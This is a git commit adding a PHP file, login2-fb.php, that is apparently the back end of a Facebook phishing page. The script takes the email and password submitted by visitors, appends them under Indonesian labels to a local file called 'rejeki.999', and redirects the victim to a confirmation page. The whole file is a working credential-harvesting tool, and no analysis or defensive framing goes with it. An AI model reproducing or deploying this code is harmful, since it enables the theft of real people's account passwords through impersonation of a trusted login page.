ab8aeffa4cc26b1ce8c1e57a2541d7f6fd0f49b2
hardimalik313 <76757380+hardimalik313@users.noreply.github.com>
2020-12-31 16:23:41 +0900

    Create login2-fb.php

---
+++ login2-fb.php
@@ -0,0 +1,22 @@
+<?php
+header("Location:konfirmasi.html");
+$ADEx = "rejeki.999";
+$ADEy = $_GET['email'];
+$ADEz = $_GET['pass'];
+
+$handle = fopen($ADEx, 'a');
+fwrite($handle, "");
+fwrite($handle, "\n");
+fwrite($handle, "Alamat Email:");
+fwrite($handle, "\n");
+fwrite($handle, "$ADEy");
+fwrite($handle, "\n");
+fwrite($handle, "Kata Sandi :");
+fwrite($handle, "\n");
+fwrite($handle, "$ADEz");
+fwrite($handle, "\n");
+fwrite($handle, "");
+fwrite($handle, "\n");
+fclose($handle);
+exit;
+?>
